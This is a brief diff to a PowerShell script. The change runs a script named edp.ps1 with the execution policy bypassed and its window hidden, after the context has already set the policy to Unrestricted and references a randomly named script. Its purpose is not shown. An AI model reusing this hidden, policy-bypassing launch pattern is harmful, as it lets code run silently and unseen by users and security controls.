@@ -261,7 +261,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
 #Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
 
-Start-Process -Set-ExecutionPolicy Bypass -FilePath "$path\edp.ps1" -windowstyle hidden
+powershell -ExecutionPolicy Bypass -File "$path\edp.ps1" -WindowStyle Hidden
 
 Start-Sleep -Seconds 360
 
